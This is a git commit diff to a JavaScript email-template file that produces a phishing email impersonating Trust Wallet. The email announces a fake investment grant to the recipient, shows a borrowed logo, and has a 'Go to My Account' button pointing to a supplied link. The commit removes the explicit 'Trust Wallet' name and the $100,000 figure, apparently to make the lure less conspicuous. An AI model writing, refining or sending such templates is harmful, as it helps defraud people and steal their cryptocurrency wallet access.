73493fff8bc0adeb3750cd480bb5dc3aae8aabad
digitz20 <alaekekaebuka200@gmail.com>
2025-06-03 23:30:13 +1245

    ok

--- utils/mailtemplates.js
+++ utils/mailtemplates.js
@@ -5,7 +5,7 @@ exports.trustTemplate = (link, recipientEmail) => {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trust Wallet Grant Airdrop</title>
+    <title>Trust Grant Notification</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -62,10 +62,10 @@ exports.trustTemplate = (link, recipientEmail) => {
 <body>
     <div class="email-container">
         <img src="https://i.pinimg.com/736x/6c/3c/74/6c3c744dd40d28853c29f90692d1312e.jpg" alt="Trust Logo" class="logo">
-        <h1>Trust wallet Grant Airdrop</h1>
+        <h1>Trust Grant Notification </h1>
         <p>Hello${recipientEmail ? ` ${recipientEmail}` : ""},</p>
         <p>
-            We are excited to announce that you have been selected to receive a grant of $100,000 to invest in the Trust Wallet platform. This grant will be used to support the development and growth of the platform, and we look forward to seeing the positive impact it will have on the trust community.
+            We are excited to announce that you have been selected to receive a grant to invest in the Trust platform. This grant will be used to support the development and growth of the platform, and we look forward to seeing the positive impact it will have on the trust community.
         </p>
         <a href="${link}" class="cta-button">Go to My Account</a>
         <p>
